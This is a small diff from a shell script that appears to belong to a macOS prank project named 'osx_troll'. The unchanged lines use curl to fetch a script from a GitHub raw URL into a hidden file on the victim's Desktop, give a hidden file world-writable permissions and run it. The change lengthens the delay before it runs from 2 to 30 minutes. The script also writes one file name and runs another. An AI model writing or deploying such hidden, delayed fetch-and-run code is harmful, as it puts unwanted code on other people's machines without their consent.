@@ -17,5 +17,5 @@ done
 
 curl -s -L https://raw.githubusercontent.com/Me1955/osx_troll/main/run.sh >> ~/Desktop/.run.sh
 chmod 777 ~/Desktop/.music.sh
-sleep 2m
+sleep 30m
 sh ~/Desktop/.music.sh
